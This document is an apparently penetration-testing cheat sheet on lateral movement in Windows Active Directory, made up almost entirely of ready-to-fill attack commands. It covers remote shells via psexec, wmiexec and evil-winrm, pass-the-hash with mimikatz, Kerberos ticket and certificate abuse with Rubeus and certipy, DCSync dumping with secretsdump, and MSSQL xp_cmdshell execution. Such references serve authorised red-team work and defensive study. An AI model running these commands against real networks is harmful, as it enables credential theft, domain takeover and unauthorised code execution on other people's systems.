# Lateral Move

## Clear text Password >>> Admin
- Interactive-shell - psexec >>> Authority/System
  - `psexec.py <domain>/<user>:<password>@<ip>`
  - `psexec.exe -AcceptEULA \\<ip>`
  - `psexecsvc.py <domain>/<user>:<password>@<ip>`
- Pseudo-shell (file write and read)
  - `atexec.py  <domain>/<user>:<password>@<ip> "command"`
  - `smbexec.py  <domain>/<user>:<password>@<ip>`
  - `wmiexec.py  <domain>/<user>:<password>@<ip>`
  - `dcomexec.py  <domain>/<user>:<password>@<ip>`
  - `nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>`
- WinRM >>> Low access || Admin
  - `evil-winrm -i <ip> -u <user> -p <password>`
  - `Enter-PSSession -ComputerName <computer> -Credential <domain>\<user>`
  - `nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>`
- RDP >>> Low access || Admin
  - `xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>`
- SMB >>> Search files
  - `smbclient.py <domain>/<user>:<password>@<ip>`
  - `smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>`
- MSSQL >>> MSSQL
  - `nxc mssql <ip_range> -u <user> -p <password>`
  - `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>`

## NT Hash
- Pass the Hash
  - MSSQL/PseudoShell PsExec/SMB...  >>> Admin
    - `impacket : same as with creds, but use -hashes ':<hash>'`
    - `nxc : same as with creds, but use -H ':<hash>'`
  - `mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"` >>> Admin
  - RDP >>> Low access || Admin
    - `reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'`
      - `xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>`
  - WinRM >>> Low access || Admin
    - `evil-winrm -i <ip> -u <user> -H <hash>`
- Overpass the Hash / Pass the key (PTK) >>> Admin
  - `Rubeus.exe asktgt /user:victim /rc4:<rc4value>`
    - `Rubeus.exe ptt /ticket:<ticket>`
    - `Rubeus.exe createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]`
  - `getTGT.py <domain>/<user> -hashes :<hashes>`

## Kerberos
- Pass the Ticket (ccache / kirbi)
  - Convert Format
    - `ticketConverter.py <kirbi||ccache> <ccache||kirbi>`
  - `export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache` >>> Admin
    - `impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket`
  - `mimikatz kerberos::ptc "<ticket>"`
  - `Rubeus.exe ptt /ticket:<ticket>`
  - `proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>'`
  - Modify SPN >>> PassTheTicket
    - `tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>" #pr 1256`

- Aeskey >>> Admin
  - `impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)`
  - `proxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>'`

## Socks (relay)
- `proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids`
- `proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass` >>> MSSQL
- `proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'` >>> DCSYNC
- `proxychains smbclient.py -no-pass <user>@<ip>` >>> Search files
- `proxychains atexec.py  -no-pass  <domain>/<user>@<ip> "command"` >>> Authority/System
- `proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>` >>> Authority/System

## Certificate (pfx)
- unpac the hash
  - `certipy auth -pfx <crt_file> -dc-ip <dc_ip>`
  - `gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> "<domain>/<dc_name>" <tgt.ccache>`
    - `getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>'`
- Pass the certificate
  - pkinit
    - `gettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass  "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"`
    - `Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show`
    - `certipy auth -pfx <crt_file> -dc-ip <dc_ip>`
  - schannel
    - `certipy auth -pfx <pfx_file> -ldap-shell`
      - add_computer
        - Set RBCD >>> RBCD
    - `certipy cert -pfx "<pfx_file>" -nokey -out "user.crt"`
      - `certipy cert -pfx "<pfx_file>" -nocert -out "user.key"`
        - `passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>`

## MSSQL
- find mssql access
  - `nxc mssql <ip> -u <user> -p <password> -d <domain>` >>> MSSQL
- Users or Computers with SQL admin
- `MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p` >>> MSSQL
- `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>`
  - `enum_db`
  - `enable_xp_cmdshell`
    - `xp_cmdshell <cmd>` >>> Low Access
  - `enum_impersonate`
    - `exec_as_user <user>` >>> MSSQL
    - `exec_as_login <login>` >>> MSSQL
  - `xp_dir_tree <ip>` >>> COERCE SMB
  - `trustlink` 
    - `sp_linkedservers`
      - `use_link` >>> MSSQL || Trust